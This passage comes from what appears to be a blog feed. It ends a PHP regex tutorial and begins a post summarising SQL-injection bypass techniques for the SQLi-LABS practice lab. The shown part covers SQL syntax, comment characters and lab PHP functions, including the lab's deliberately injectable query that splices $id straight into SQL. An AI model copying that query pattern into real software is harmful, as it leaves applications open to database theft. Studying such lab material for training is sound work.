class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//&#123;n&#125;</span><br><span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>    [<span class="hljs-number">0</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;tst&quot;</span><br>  &#125;<br>&#125;<br><span class="hljs-comment">//&#123;n,&#125;</span><br><span class="hljs-keyword">int</span>(<span class="hljs-number">3</span>)<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">array</span>(<span class="hljs-number">3</span>) &#123;<br>    [<span class="hljs-number">0</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;tst&quot;</span><br>    [<span class="hljs-number">1</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;test&quot;</span><br>    [<span class="hljs-number">2</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;teeeest&quot;</span><br>  &#125;<br>&#125;<br><span class="hljs-comment">//&#123;n/m&#125;</span><br><span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) &#123;<br>    [<span class="hljs-number">0</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;tst&quot;</span><br>    [<span class="hljs-number">1</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;test&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>^、\A</code>和<code>$、\Z</code>：<code>^</code>或<code>\A</code>表示其后第一个字符为字符串开始字符；<code>$</code>或<code>\Z</code>表示其前第一个字符为字符串结束字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>$pattern&#x3D;&#39;&#x2F;^test&#x2F;&#39;;&#x2F;&#x2F;^或\A匹配其后第一个字符为字符串开始字符<br>$str&#x3D;&quot;testteeeestTEXT&quot;;&#x2F;&#x2F;该字符串为被搜索的字符串<br>var_dump(preg_match_all($pattern, $str, $arr));<br>var_dump($arr);<br>?&gt;<br>&lt;?php<br>$pattern&#x3D;&#39;&#x2F;test$&#x2F;&#39;;&#x2F;&#x2F;$匹配其前第一个字符为字符串结束字符<br>$str&#x3D;&quot;teeeestTEXTtest&quot;;&#x2F;&#x2F;该字符串为被搜索的字符串<br>var_dump(preg_match_all($pattern, $str, $arr));<br>var_dump($arr);<br>?&gt;<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//上面两个代码结果一致</span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span> &#123;<br>  <span class="hljs-selector-attr">[0]</span>=&gt;<br>  array(<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-selector-attr">[0]</span>=&gt;<br>    string(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;test&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>|</code>：表示可以存在两个或多个正则表达式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>$pattern&#x3D;&#39;&#x2F;test|TEXT&#x2F;&#39;;&#x2F;&#x2F;|表示可以存在两个或多个正则表达式<br>$str&#x3D;&quot;teeeestTEXTtest&quot;;&#x2F;&#x2F;该字符串为被搜索的字符串<br>var_dump(preg_match_all($pattern, $str, $arr));<br>var_dump($arr);<br>?&gt;<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">int(2)<br>array(1) &#123;<br>  [0]&#x3D;&gt;<br>  array(2) &#123;<br>    [0]&#x3D;&gt;<br>    string(4) &quot;TEXT&quot;<br>    [1]&#x3D;&gt;<br>    string(4) &quot;test&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>[]</code>或<code>[^]</code>：前者表示括号中存在的任意一个字符，后者表示除括号中存在的所有字符之外的任意一个字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pattern</span>=<span class="hljs-string">&#x27;/t[abcde]st/&#x27;</span>;<span class="hljs-comment">//[]匹配括号中存在的任意一个字符</span><br><span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;testTEXTtast&quot;</span>;<span class="hljs-comment">//该字符串为被搜索的字符串</span><br>var_dump(preg_match_all(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$arr</span>));<br>var_dump(<span class="hljs-variable">$arr</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pattern</span>=<span class="hljs-string">&#x27;/t[^abcde]st/&#x27;</span>;<span class="hljs-comment">//[^]匹配除括号中存在的所有字符之外的任意一个字符</span><br><span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;testTEXTt_st&quot;</span>;<span class="hljs-comment">//该字符串为被搜索的字符串</span><br>var_dump(preg_match_all(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$arr</span>));<br>var_dump(<span class="hljs-variable">$arr</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//[]</span><br><span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) &#123;<br>    [<span class="hljs-number">0</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;test&quot;</span><br>    [<span class="hljs-number">1</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;tast&quot;</span><br>  &#125;<br>&#125;<br><span class="hljs-comment">//[^]</span><br><span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>    [<span class="hljs-number">0</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;t_st&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>()</code>：表示将括弧中的字符串当作一个整体获取，一般配合<code>\\n</code>（n为阿拉伯数字，从1开始依次出现）使用，<code>\\n</code>表示前面匹配到的第n个括号里面的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>$pattern&#x3D;&#39;&#x2F;t(e)st\\1&#x2F;&#39;;&#x2F;&#x2F;()将括弧中的字符串当作一个整体获取<br>$str&#x3D;&quot;testeTEXTt_st&quot;;&#x2F;&#x2F;该字符串为被搜索的字符串<br>var_dump(preg_match_all($pattern, $str, $arr));<br>var_dump($arr);<br>?&gt;<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">int(1)<br>array(2) &#123;<br>  [0]&#x3D;&gt;<br>  array(1) &#123;<br>    [0]&#x3D;&gt;<br>    string(5) &quot;teste&quot;<br>  &#125;<br>  [1]&#x3D;&gt;<br>  array(1) &#123;<br>    [0]&#x3D;&gt;<br>    string(1) &quot;e&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><h5 id="元组字符组合（常见）"><a href="#元组字符组合（常见）" class="headerlink" title="元组字符组合（常见）"></a>元组字符组合（常见）</h5><ul><li><p><code>.*</code>：<code>.</code>字符代表除换行符外的任意字符，<code>*</code>字符可代表一串同一个或多个字符组成的字符串。合起来便可以代表随机匹配到的一串由一个或多个未知字符组成的字符串，该组合会尽量匹配长的一串字符串，为贪婪匹配。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>$pattern&#x3D;&#39;&#x2F;t.*t&#x2F;&#39;;&#x2F;&#x2F;.*匹配除换行符外的任意字符<br>$str&#x3D;&quot;testeTEXTt_st&quot;;&#x2F;&#x2F;该字符串为被搜索的字符串<br>var_dump(preg_match_all($pattern, $str, $arr));<br>var_dump($arr);<br>?&gt;<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">int(1)<br>array(1) &#123;<br>  [0]&#x3D;&gt;<br>  array(1) &#123;<br>    [0]&#x3D;&gt;<br>    string(13) &quot;testeTEXTt_st&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>.*?</code>：<code>.</code>字符代表除换行符外的任意字符，<code>*</code>字符可代表其前面的第一个字符，<code>？</code>字符可代表其前面的第一个字符。合起来便是有限长的一个字符串（一次特征字符串），该组合在匹配尽量短的多个字符串，为懒惰匹配。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>$pattern&#x3D;&#39;&#x2F;t.*?t&#x2F;&#39;;&#x2F;&#x2F;.*?匹配除换行符外的任意字符<br>$str&#x3D;&quot;testeTEXTt_st&quot;;&#x2F;&#x2F;该字符串为被搜索的字符串<br>var_dump(preg_match_all($pattern, $str, $arr));<br>var_dump($arr);<br>?&gt;<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">int(2)<br>array(1) &#123;<br>  [0]&#x3D;&gt;<br>  array(2) &#123;<br>    [0]&#x3D;&gt;<br>    string(4) &quot;test&quot;<br>    [1]&#x3D;&gt;<br>    string(4) &quot;t_st&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>等等等等</p></li></ul></li><li><h5 id="模式修正符（常见）"><a href="#模式修正符（常见）" class="headerlink" title="模式修正符（常见）"></a>模式修正符（常见）</h5><p>模式修正符用在定界符后面，用于扩展正则表达式的功能（常见的有<code>i、m、s、U</code>）。</p><ul><li><p><code>i</code>：让正则表达式在匹配的时候不区分大小写</p><p>举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>$pattern&#x3D;&#39;&#x2F;test&#x2F;i&#39;;&#x2F;&#x2F;i让正则表达式在匹配的时候不区分大小写<br>$str&#x3D;&quot;testeTESTtEst&quot;;&#x2F;&#x2F;该字符串为被搜索的字符串<br>var_dump(preg_match_all($pattern, $str, $arr));<br>var_dump($arr);<br>?&gt;<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">int(3)<br>array(1) &#123;<br>  [0]&#x3D;&gt;<br>  array(3) &#123;<br>    [0]&#x3D;&gt;<br>    string(4) &quot;test&quot;<br>    [1]&#x3D;&gt;<br>    string(4) &quot;TEST&quot;<br>    [2]&#x3D;&gt;<br>    string(4) &quot;tEst&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>m</code>：实现多行匹配，将一串含一个或多个<code>\n</code>符的字符串看成多串字符串处理。使用时必须满足两个条件：一是被搜索的字符串中必须含有<code>\n</code>符，二是正则表达式中必须有<code>^</code>或<code>$</code>符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>$pattern&#x3D;&#39;&#x2F;^test&#x2F;m&#39;;&#x2F;&#x2F;m实现多行匹配<br>$str&#x3D;&quot;teste\ntEST\ntEst&quot;;&#x2F;&#x2F;该字符串为被搜索的字符串<br>var_dump(preg_match_all($pattern, $str, $arr));<br>var_dump($arr);<br>?&gt;<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">int(1)<br>array(1) &#123;<br>  [0]&#x3D;&gt;<br>  array(1) &#123;<br>    [0]&#x3D;&gt;<br>    string(4) &quot;test&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>s</code>：可实现效果与<code>m</code>一样，该修正符专门与<code>.</code>元字符配合使用，因为有些情况下含<code>.</code>的正则表达式不接受<code>\n</code>符。简单的说，<code>s</code>修正符可以让<code>.</code>元字符匹配所有字符，包括换行符<code>\n</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pattern</span>=<span class="hljs-string">&#x27;/t.st/s&#x27;</span>;<span class="hljs-comment">//s修正符可以让`.`元字符匹配所有字符，包括换行符\n</span><br><span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;t\nste\ntEST\ntEst&quot;</span>;<span class="hljs-comment">//该字符串为被搜索的字符串</span><br>var_dump(preg_match_all(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$arr</span>));<br>var_dump(<span class="hljs-variable">$arr</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">int(2)<br>array(1) &#123;<br>  [0]&#x3D;&gt;<br>  array(2) &#123;<br>    [0]&#x3D;&gt;<br>    string(4) &quot;t<br>st&quot;<br>    [1]&#x3D;&gt;<br>    string(4) &quot;tEst&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>U</code>：禁止贪婪匹配，等价于<code>.*?</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>$pattern&#x3D;&#39;&#x2F;t.*t&#x2F;U&#39;;&#x2F;&#x2F;\d匹配十进制数<br>$str&#x3D;&quot;tesstetESt\ntEst&quot;;&#x2F;&#x2F;该字符串为被搜索的字符串<br>var_dump(preg_match_all($pattern, $str, $arr));<br>var_dump($arr);<br>?&gt;<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">int(3)<br>array(1) &#123;<br>  [0]&#x3D;&gt;<br>  array(3) &#123;<br>    [0]&#x3D;&gt;<br>    string(5) &quot;tesst&quot;<br>    [1]&#x3D;&gt;<br>    string(4) &quot;tESt&quot;<br>    [2]&#x3D;&gt;<br>    string(4) &quot;tEst&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>模式修正符可以搭配使用，搭配效果是修正符功能的交集。如<code>Ui</code>是不区分大小写下禁止贪婪匹配。</p></li></ul></li></ol><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>  以上内容就是我在本次学习中理解到的正则表达式。正则表达式不是php的产物，在其他语言中也有相同的功能。这里用的是php解释，如果有什么说的不正确或者不足，希望大牛们能提出批评。这是小弟的QQ：2790169047，谢谢大牛。</p><p>参考文献：</p><p><a href="http://www.runoob.com/php/">http://www.runoob.com/php/</a></p><p><a href="http://www.php.net/manual/zh/function.preg-match.php">http://www.php.net/manual/zh/function.preg-match.php</a></p><p><a href="http://edu.51cto.com/course/1676.html">http://edu.51cto.com/course/1676.html</a></p>]]></content>
    
    
    <categories>
      
      <category>其他学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>preg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLi-LABS LESS-1~28a绕过姿势小结</title>
    <link href="/2021/05/09/SQLi-LABS-LESS-1-28a%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E5%B0%8F%E7%BB%93/"/>
    <url>/2021/05/09/SQLi-LABS-LESS-1-28a%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E5%B0%8F%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="SQLi-LABS-LESS-1-28a绕过姿势小结"><a href="#SQLi-LABS-LESS-1-28a绕过姿势小结" class="headerlink" title="SQLi-LABS LESS-1~28a绕过姿势小结"></a>SQLi-LABS LESS-1~28a绕过姿势小结</h1><h3 id="感悟："><a href="#感悟：" class="headerlink" title="感悟："></a>感悟：</h3><p>  上一篇对28a及之前的关卡做<a href="https://shuishangyun.github.io/2018/11/30/SQLI-LABS%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93%EF%BC%88Less-1%EF%BD%9ELess-28a%EF%BC%89">理论小结</a>的时候就想好再写一篇绕过方式小结，这也是为了方便以后忘记的时候能想起来（虽然不一定写的完整），如果有什么错误，还请各位大表哥大表姐能指条明路。上一次小结中只是单纯的介绍了一下注入漏洞的分类和利用方法，但是不是和具体，这个会在这章补充，而且不写漏洞的危害主要是因为SQL注入是WEB漏洞中能排进前三的漏洞，简直就是一大威胁，这个应该是了解注入之前就该了解的，没必要在我这重复一遍。好了，多的废话也不想讲了，还是进入正题的好。</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文:"></a>正文:</h3><hr><p>  在正式记录SQL注入过程之前，在这里要先介绍几个SQL常用语法和PHP接收及处理变量的常用语法。</p><h6 id="SQL语法："><a href="#SQL语法：" class="headerlink" title="SQL语法："></a>SQL语法：</h6><ol><li><p>增：</p><ul><li>插入元组：<code>insert into &lt;已有的新表&gt; values([列名&lt;约束条件&gt;],[列名&lt;约束条件&gt;],······),([列名&lt;约束条件&gt;],[列名&lt;约束条件&gt;],······),···</code></li><li>复制表数据：<code>insert into &lt;已有的新表&gt; (列名) select &lt;原表列名&gt; from &lt;原表名&gt;</code></li><li>导入数据至新建表：<code>select &lt;新建表列名&gt; into &lt;新建表名&gt; from &lt;原表名&gt;</code></li><li>Union 插入多元组：<code>insert &lt;表名&gt; &lt;列名&gt; select &lt;列值&gt; tnion select &lt;列值&gt;</code></li></ul></li><li><p>删：</p><ul><li>删列值：<code>delete from &lt;表名&gt; [where &lt;删除条件&gt;]</code></li><li>删表：<code>drop table &lt;表名&gt;</code></li></ul></li><li><p>改：</p><ul><li><code>update &lt;表名&gt; set &lt;列名=更新值&gt; [where &lt;更新条件&gt;]</code></li></ul></li><li><p>查：</p><ul><li><p>条件查询：<code>select &lt;列名&gt; from &lt;表名&gt; [where &lt;查询条件表达试&gt;[order by &lt;排序的列名&gt;[asc或desc]</code></p></li><li><p>标记查询：<code>select &lt;列名&gt;, &lt;标识&gt; as &lt;标识名&gt; from &lt;表名&gt;</code></p></li><li><p>关键字查询：<code>select top &lt;数值&gt; &lt;列名&gt; from &lt;表名&gt;</code> 查询前指定行</p><p><code>select top &lt;数值&gt; percent &lt;列名&gt; from &lt;表名&gt;</code>查询前指定百分比</p></li></ul></li><li><p>排序：<code>order by[列名]</code>用于对指定列排序，<code>group by[列名]</code>对指定列进行分组排序</p></li><li><p>子查询：<code>select &lt;列名&gt; from &lt;表名1&gt; where &lt;约束条件1&gt;[select &lt;列名&gt; from &lt;表名2&gt; where &lt;约束条件2&gt;]</code></p></li><li><p>联合查询：<code>select * from &lt;表名1&gt; union select * from &lt;表名2&gt;</code></p></li><li><p>连接查询：</p><ul><li><p>内连接：</p><p><code>select &lt;列名&gt; from &lt;表a&gt;,&lt;表b&gt; where &lt;表a&gt;.&lt;列名&gt;=&lt;表b&gt;.&lt;列名&gt;</code></p><p><code>select &lt;列名&gt; from &lt;表a&gt; inner jion &lt;表b&gt; on (&lt;表a&gt;.&lt;列名&gt;=&lt;表b&gt;.&lt;列名&gt;)</code></p></li><li><p>外连接：</p><p><code>select &lt;列名0&gt; from &lt;表名1&gt; as &lt;别名1&gt; left outer jion &lt;表名2&gt; as &lt;别名2&gt; on &lt;别名1&gt;.&lt;列名&gt;=&lt;别名2&gt;.&lt;列名&gt;</code></p></li></ul></li><li><p>约束条件：<code>and,or,&gt;,&lt;,=,&lt;&gt;,!=,like,between and,jion in,in,not,having</code></p></li><li><p>注释符：<code>#,--,/**/,/xxx/,/!xxx/</code></p></li></ol><h6 id="PHP函数："><a href="#PHP函数：" class="headerlink" title="PHP函数："></a>PHP函数：</h6><p>  函数全部来自sqli-labs前28a关卡的index.php文件：</p><p>  <code>include($file)</code>函数将 PHP 文件的内容插入另一个 PHP 文件;</p><p>  <code>isset($_GET[&#39;id&#39;])</code>用于判断是否存在该变量；</p><p>  <code>$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);</code>将URL传过来的ID值存入result.txt中；</p><p>  <code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code>为sql语句，也是注入的关键；</p><p>  <code>$result=mysql_query($sql);</code>执行一条sql语句，执行成功返回true，失败返回false，保留缓存；</p><p>  <code>$row = mysql_fetch_array($result);</code>从结果集中取得一行作为关联数组，或数字数组，或二者兼有，返回根据从结果集取得的行生成数组，如果没有更多行则返回 false；</p><p>  <code>mysql_error()</code>返回上一个 MySQL 操作产生的文本错误信息；</p><p>  <code>check_input()</code>文件内自定义函数，主要用来过滤特殊字符，基本限定所有直接绕过方式，具体内容解释如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_input</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>))<br>    &#123;<br>        <span class="hljs-comment">// truncation (see comments)</span><br>        <span class="hljs-variable">$value</span> = substr(<span class="hljs-variable">$value</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>);<br>    &#125;<br>    <span class="hljs-comment">// Stripslashes if magic quotes enabled</span><br><span class="hljs-keyword">if</span> (get_magic_quotes_gpc())<br>    &#123;<br>        <span class="hljs-variable">$value</span> = stripslashes(<span class="hljs-variable">$value</span>);<br>    &#125;<br><span class="hljs-comment">// Quote if not a number</span><br><span class="hljs-keyword">if</span> (!ctype_digit(<span class="hljs-variable">$value</span>))<br>    &#123;<br>        <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-variable">$value</span> = intval(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>  <code>empty($value)</code> 函数用于检查一个变量是否为空；</p><p>  <code>substr($str,$begin,$length)</code>函数取字符串子串，第一个参数为主字符串，第二个参数为主字符串中截取子串开始的位置，第三个参数为截取子串的长度；</p><p>  <code>get_magic_quotes_gpc()</code>函数取得 PHP 环境变数 magic_quotes_gpc 的值，返回 0 表示关闭本功能，返回 1 表示本功能打开。当 magic_quotes_gpc 打开时，所有的 ‘ (单引号), ” (双引号), (反斜线) and 空字符会自动转义为含有反斜线的溢出字符。</p><p>  <code>stripslashes($str)</code>函数删除反斜杠；</p><p>  <code>ctype_digit($str)</code>函数检测字符串中的字符是否都是数字，负数和小数会检测不通过。 注意，参数一定要是字符串，如果不是字符串，则会返回0/FASLE。</p><p>  <code>mysql_real_escape_string($value,$connection)</code>函数转义 SQL 